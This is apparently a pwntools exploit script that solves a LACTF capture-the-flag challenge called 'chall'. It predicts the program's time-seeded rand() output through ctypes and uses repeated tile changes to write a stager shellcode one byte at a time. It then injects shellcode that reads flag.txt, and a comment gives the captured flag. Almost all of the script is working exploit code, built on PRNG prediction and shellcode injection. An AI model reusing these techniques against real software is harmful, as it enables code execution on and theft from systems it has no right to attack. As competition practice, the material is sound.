import ctypes
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = process('./chall')
gdb.attach(p, '''
    brva 0x1639
    continue
''')

# p = remote('chall.lac.tf', 31338)

# replicate PRNG
libc = ctypes.CDLL('libc.so.6')
libc.time.argtypes = [ctypes.POINTER(ctypes.c_long)]
libc.srand.argtypes = [ctypes.c_uint]
current_time = ctypes.c_long()
libc.time(ctypes.byref(current_time))
libc.srand(ctypes.c_uint(current_time.value))
libc.rand.restype = ctypes.c_int

# 1. brute-force to change shellcode bytes from initial state to target state
initial = []
for _ in range(14):
    initial.append(libc.rand()&0xff)
target = list(asm('''
    xor eax, eax
    lea rsi, [rdi+0x10]
    xor edi, edi
    mov dl, 0xff
    syscall
    jmp rsi
'''))
for i in range(len(target)):
    while initial[i] != target[i]:
        p.sendlineafter(b"> ", str(1).encode())
        p.sendlineafter(b"Which tile? (0-13): ", str(i).encode())
        initial[i] = libc.rand()&0xff

# 2. shellcode injection to cat flag.txt
p.sendlineafter(b"> ", str(2).encode())
p.sendafter(b"    TRIPLE WORD SCORE!\n\n", asm(shellcraft.cat('./flag.txt')))

p.interactive()

# lactf{gg_y0u_sp3ll3d_sh3llc0d3}